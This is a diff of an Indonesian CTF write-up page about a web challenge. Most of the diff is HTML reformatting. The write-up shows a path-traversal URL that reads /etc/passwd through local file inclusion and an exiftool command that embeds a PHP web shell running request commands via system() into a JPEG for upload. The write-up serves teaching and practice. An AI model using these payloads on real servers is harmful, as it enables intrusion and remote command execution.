@@ -558,13 +558,13 @@ Author: Fedra
 <p>Terdapat 2 fitur: PING dan FileUp
 Setelah dicoba-coba, fitur PING ini rabbit hole.
 Nah, untuk membantu mengerucutkan ke kesimpulan ini, kita juga perlu terlebih dahulu menyadari bahwa tab PING dan FileUp ini diakses melalui query parameter di URL
-<code>https://cyberchampion-web-101.chals.io/index.php?page=ping.php</code>
-<code>https://cyberchampion-web-101.chals.io/index.php?page=upload.php</code>
-Begitu juga dengan tab Home
+<code>https://cyberchampion-web-101.chals.io/index.php?page=ping.php</code></p>
+<p><code>https://cyberchampion-web-101.chals.io/index.php?page=upload.php</code></p>
+<p>Begitu juga dengan tab Home
 <code>https://cyberchampion-web-101.chals.io/index.php?page=index.php</code>
 Tentunya ini mencurigakan, dan wajib kita coba test Local File Inclusion (LFI) pada query parameter <code>page</code> tersebut.</p>
-<p>Benar saja, terdapat LFI yang bisa membaca isi <code>etc/passwd</code>
-<code>https://cyberchampion-web-101.chals.io/index.php?page=../../../../etc/passwd</code>
+<p>Benar saja, terdapat LFI yang bisa membaca isi <code>etc/passwd</code></p>
+<p><code>https://cyberchampion-web-101.chals.io/index.php?page=../../../../etc/passwd</code>
 <img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/TSA-CTF-2024/web1.png?raw=true" alt=""></p>
 <p>Nah, karena kita bisa meng-include file, jika kita juga bisa meng-include shell file yang kita sediakan sendiri, maka kita dapat dengan mudah mendapatkan Remote Code Execution (RCE). Artinya, kemungkinan LFI ini ada hubungannya dengan file upload, karena dengan file upload, kita bisa memasukkan shell file ke dalam server, dan tinggal menggunakan LFI tadi untuk &lsquo;memanggil&rsquo; file tersebut.</p>
 <p>Setelah dicoba-coba, terlihat bahwa fitur upload dapat merespon dengan lokasi hasil upload, terkedang tidak ada respon. Ini menandakan bahwa terdapat ketentuan yang harus dipenuhi, agar upload file berhasil, sehingga didapatkan respon lokasi hasil upload. Berdasarkan pengamat, dapat disimpulkan ketentuannya:</p>
@@ -573,9 +573,10 @@ Tentunya ini mencurigakan, dan wajib kita coba test Local File Inclusion (LFI) p
 <li>File yang di upload harus memiliki nama unik (nama file yang sama belum pernah di upload sebelumnya)</li>
 </ol>
 <p>Kita tahu bahwa web server menggunakan php. Tetapi kita tidak bisa meng upload shell php. Maka dari itu, ide yang bisa di explore adalah dengan meng-upload file JPEG yang telah diinjeksi dengan PHP shell code. Kita dapat melakukan ini dengan exiftool.</p>
-<p>Download file JPEG berukuran kecil, misalnya bisa menggunakan ini <a href="https://upload.wikimedia.org/wikipedia/commons/3/38/JPEG_example_JPG_RIP_001.jpg">https://upload.wikimedia.org/wikipedia/commons/3/38/JPEG_example_JPG_RIP_001.jpg</a>. One-liner PHP command berikut dapat diinjeksikan ke field baru <code>DocumentName</code> pada gambar tadi:
-<code>&lt;h1&gt;&lt;br&gt;&lt;?php if(isset(\$_REQUEST['cmd'])){echo '&lt;pre&gt;';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '&lt;/pre&gt;';} __halt_compiler();?&gt;&lt;/h1&gt;</code></p>
-<pre tabindex="0"><code>❯ exiftool -DocumentName=&#34;&lt;h1&gt;&lt;br&gt;&lt;?php if(isset(\$_REQUEST[&#39;cmd&#39;])){echo &#39;&lt;pre&gt;&#39;;\$cmd = (\$_REQUEST[&#39;cmd&#39;]);system(\$cmd);echo &#39;&lt;/pre&gt;&#39;;} __halt_compiler();?&gt;&lt;/h1&gt;&#34; JPEG_example_JPG_RIP_001.jpg
+<p>Download file JPEG berukuran kecil, misalnya bisa menggunakan ini <a href="https://upload.wikimedia.org/wikipedia/commons/3/38/JPEG_example_JPG_RIP_001.jpg">https://upload.wikimedia.org/wikipedia/commons/3/38/JPEG_example_JPG_RIP_001.jpg</a>.
+One-liner PHP command berikut dapat diinjeksikan ke field baru <code>DocumentName</code> pada gambar tadi:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">br</span><span style="color:#f92672">&gt;&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>(<span style="color:#a6e22e">\</span>$_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>])){<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;pre&gt;&#39;</span>;<span style="color:#a6e22e">\</span>$cmd <span style="color:#f92672">=</span> (<span style="color:#a6e22e">\</span>$_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);<span style="color:#a6e22e">system</span>(<span style="color:#a6e22e">\</span>$cmd);<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>;} <span style="color:#a6e22e">__halt_compiler</span>();<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;/h1&gt;
+</span></span></span></code></pre></div><pre tabindex="0"><code>❯ exiftool -DocumentName=&#34;&lt;h1&gt;&lt;br&gt;&lt;?php if(isset(\$_REQUEST[&#39;cmd&#39;])){echo &#39;&lt;pre&gt;&#39;;\$cmd = (\$_REQUEST[&#39;cmd&#39;]);system(\$cmd);echo &#39;&lt;/pre&gt;&#39;;} __halt_compiler();?&gt;&lt;/h1&gt;&#34; JPEG_example_JPG_RIP_001.jpg
     1 image files updated
 
 ❯ exiftool JPEG_example_JPG_RIP_001.jpg
